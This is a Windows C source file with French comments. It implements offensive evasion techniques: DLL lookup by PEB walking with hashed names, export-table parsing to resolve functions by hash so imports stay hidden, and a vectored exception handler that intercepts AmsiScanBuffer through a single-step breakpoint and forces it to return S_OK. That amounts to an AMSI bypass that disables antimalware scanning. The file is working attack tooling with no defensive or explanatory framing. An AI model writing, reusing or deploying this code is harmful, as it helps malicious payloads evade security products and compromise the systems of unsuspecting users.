#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#include "peb.h"
#include "tools.h"

// Hash pour wchar_t — utilise pour pebWalking (BaseDllName.Buffer)
unsigned int getHashW(const wchar_t* s) {
    unsigned int h = 0x5F3759DF;
    while (*s) {
        unsigned char c = (unsigned char)(*s++ & 0xFF);
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h += c;
        h += (h << 7);
        h ^= (h >> 5);
    }
    h += (h << 3);
    h ^= (h >> 13);
    h += (h << 17);
    return h;
}

// Hash pour char* — utilise pour peParsing (noms de fonctions dans l'EAT)
unsigned int getHash(const char* s) {
    unsigned int h = 0x5F3759DF;
    while (*s) {
        unsigned char c = (unsigned char)*s++;
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h += c;
        h += (h << 7);
        h ^= (h >> 5);
    }
    h += (h << 3);
    h ^= (h >> 13);
    h += (h << 17);
    return h;
}

// pebWalking utilise getHashW car BaseDllName.Buffer est wchar_t*
PVOID pebWalking(const unsigned int dllSearched) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA peb_ldr = peb->Ldr;
    PLIST_ENTRY head = &peb_ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(
            curr,
            MY_LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );

        if (entry->BaseDllName.Buffer != NULL &&
            entry->BaseDllName.Length > 0 &&
            getHashW(entry->BaseDllName.Buffer) == dllSearched) {
            return entry->DllBase;
        }
        curr = curr->Flink;
    }
    return NULL;
}

// peParsing utilise getHash car les noms dans l'EAT sont char*
PVOID peParsing(PVOID dll_addr, const unsigned int funcName) {
    if (!dll_addr) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_addr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_addr + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)dll_addr + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* funAddrs = (DWORD*)((BYTE*)dll_addr + expDir->AddressOfFunctions);
    DWORD* funNames = (DWORD*)((BYTE*)dll_addr + expDir->AddressOfNames);
    WORD* funOrdinals = (WORD*)((BYTE*)dll_addr + expDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)dll_addr + funNames[i]);
        if (getHash(name) == funcName) {
            WORD  ordinal = funOrdinals[i];
            DWORD funcRVA = funAddrs[ordinal];
            return (PVOID)((BYTE*)dll_addr + funcRVA);
        }
    }
    return NULL;
}

LONG WINAPI VEH_Handler(EXCEPTION_POINTERS* pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (pExInfo->ContextRecord->Rip == (DWORD64)g_amsScanBuffer) {
            pExInfo->ContextRecord->Rax = S_OK;
            pExInfo->ContextRecord->Rip = *(ULONG_PTR*)pExInfo->ContextRecord->Rsp;
            pExInfo->ContextRecord->Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}